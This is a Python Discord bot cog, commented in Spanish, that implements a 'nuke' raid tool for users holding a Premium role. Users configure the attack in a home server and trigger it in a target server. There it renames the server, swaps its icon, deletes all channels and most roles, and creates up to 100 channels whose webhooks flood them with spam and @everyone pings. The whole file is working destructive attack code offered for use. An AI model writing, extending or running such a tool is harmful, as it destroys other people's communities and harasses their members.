import discord
from discord.ext import commands
import asyncio
import aiohttp

# Reemplaza esto por la ID real de tu servidor principal protegido
SERVER_PROTEGIDO_ID = 1501947925377319075

# Diccionario para guardar configuraciones por usuario
configuraciones_premium = {}

# Tiempo en segundos antes de limpiar (5 horas)
LIMPIEZA_INTERVALO = 5 * 3600  # 5 horas = 18000 segundos

class NukePremium(commands.Cog):
    def __init__(self, bot):
        self.bot = bot
        # Inicia la tarea background de limpieza automática
        self.limpieza_task = asyncio.create_task(self.clear_configuraciones_periodicamente())

    async def clear_configuraciones_periodicamente(self):
        await self.bot.wait_until_ready()  # Espera a que el bot esté listo
        while not self.bot.is_closed():
            await asyncio.sleep(LIMPIEZA_INTERVALO)
            configuraciones_premium.clear()
            print("[CONFIGURACIÓN PREMIUM] ¡Todas las configuraciones han sido limpiadas automáticamente!")

    def tiene_rol_premium(self, miembro):
        """Devuelve True si el usuario tiene el rol llamado Premium."""
        return any(r.name == "Premium" for r in getattr(miembro, "roles", []))

    @commands.command(name="configurar")
    async def configurar(self, ctx):
        """Comienza el proceso de configuración para el ataque de premium."""
        if ctx.guild.id != SERVER_PROTEGIDO_ID:
            await ctx.send("❌ Este comando solo se puede usar en el servidor principal.")
            return
        
        miembro = await ctx.guild.fetch_member(ctx.author.id)
        if not self.tiene_rol_premium(miembro):
            await ctx.send("🚫 Necesitas tener el rol 'Premium' para usar este comando.")
            return

        def check(msg):
            return msg.author == ctx.author and msg.channel == ctx.channel

        preguntas = [
            ("¿Cuál será el nuevo nombre del servidor objetivo?", "nombre_server"),
            ("¿Qué nombre tendrán los canales de spam?", "nombre_canales"),
            ("¿Cuántos canales quieres crear? (máx 100)", "cant_canales"),
            ("¿Cuántos mensajes por canal quieres enviar?", "cant_mensajes"),
            ("¿Cuál será el texto del spam?", "mensaje_spam"),
            ("¿Quieres cambiar la imagen del perfil del servidor? (Si/No)", "cambiar_imagen"),
            ("¿Quieres mencionar a @everyone en cada mensaje de spam? (Si/No)", "mencionar_everyone"),
        ]

        respuestas = {}

        i = 0
        while i < len(preguntas):
            pregunta, clave = preguntas[i]
            await ctx.send(pregunta)
            try:
                msg = await self.bot.wait_for("message", timeout=60, check=check)
                # Preguntas numéricas
                if clave in ["cant_canales", "cant_mensajes"]:
                    respuestas[clave] = int(msg.content)
                # Preguntar por imagen de perfil sólo si dice "si"
                elif clave == "cambiar_imagen":
                    resp = msg.content.strip().lower()
                    if resp == "si":
                        await ctx.send("Adjunta la imagen o proporciona un enlace a la imagen:")
                        try:
                            next_img = await self.bot.wait_for("message", timeout=60, check=check)
                            if next_img.attachments:
                                respuestas["imagen_perfil"] = next_img.attachments[0].url
                            elif next_img.content.startswith("http"):
                                respuestas["imagen_perfil"] = next_img.content
                            else:
                                respuestas["imagen_perfil"] = None
                        except asyncio.TimeoutError:
                            await ctx.send("⏰ Tiempo agotado para la imagen.")
                            return
                    else:
                        respuestas["imagen_perfil"] = None
                # Preguntar por mención a everyone
                elif clave == "mencionar_everyone":
                    resp = msg.content.strip().lower()
                    respuestas["mencionar_everyone"] = resp == "si"
                else:
                    respuestas[clave] = msg.content
            except asyncio.TimeoutError:
                await ctx.send("⏰ Tiempo agotado. Inicia de nuevo el comando si deseas configurarlo.")
                return
            i += 1

        configuraciones_premium[ctx.author.id] = respuestas
        await ctx.send(
            "✅ Tu configuración está lista.\n"
            "Ahora entra al servidor objetivo y ejecuta `.premium` para activar el ataque.\n"
            "***Nota: Todas las configuraciones desaparecerán automáticamente cada 5 horas.***"
        )

    @commands.command(name="premium")
    async def premium(self, ctx):
        """Ejecuta el ataque, solo en servidores NO protegidos y si el usuario configuró previamente."""
        if ctx.guild.id == SERVER_PROTEGIDO_ID:
            await ctx.send("🔒 Por protección, este comando no se puede usar en el servidor principal.")
            return

        conf = configuraciones_premium.get(ctx.author.id)
        if not conf:
            await ctx.send("❗ No has configurado un ataque aún. Ve al servidor principal y ejecuta `.configurar` primero.")
            return

        await ctx.send("☢️ **PROTOCOLO ACTIVADO**: Iniciando...")

        guild = ctx.guild

        # FASE 1: Identidad (nombre, icono)
        try:
            args = {"name": conf["nombre_server"]}
            if conf.get("imagen_perfil"):
                async with aiohttp.ClientSession() as session:
                    async with session.get(conf["imagen_perfil"]) as resp:
                        if resp.status == 200:
                            icon_bytes = await resp.read()
                            args["icon"] = icon_bytes
            await guild.edit(**args)
        except Exception as e:
            print(f"Error cambiando nombre/icono: {e}")

        # FASE 2: Limpieza (Canales, Roles, Emojis)
        for c in list(guild.channels):
            try:
                asyncio.create_task(c.delete())
            except Exception:
                continue

        for r in list(guild.roles):
            try:
                if r.name != "@everyone" and r < guild.me.top_role:
                    asyncio.create_task(r.delete())
            except Exception:
                continue

        # FASE 3: Ataque
        for _ in range(min(conf["cant_canales"], 100)):
            try:
                ch = await guild.create_text_channel(name=conf["nombre_canales"])
                webhook = await ch.create_webhook(name=conf["nombre_server"])
                asyncio.create_task(self.spam_logic(
                    webhook,
                    conf["mensaje_spam"],
                    conf["cant_mensajes"],
                    conf.get("mencionar_everyone", False)
                ))
            except Exception as e:
                print(f"Error creando canal/webhook: {e}")
                break

        await ctx.send("🎯 ¡Ataque completado (si los permisos lo permiten)!")

    async def spam_logic(self, webhook, msg, count, mencionar_everyone=False):
        texto = f"@everyone\n{msg}" if mencionar_everyone else msg
        for _ in range(count):
            try:
                await webhook.send(content=texto, wait=False)
                await asyncio.sleep(0.0)
            except Exception as e:
                print(f"Error enviando mensaje spam: {e}")
                break

async def setup(bot):
    await bot.add_cog(NukePremium(bot))
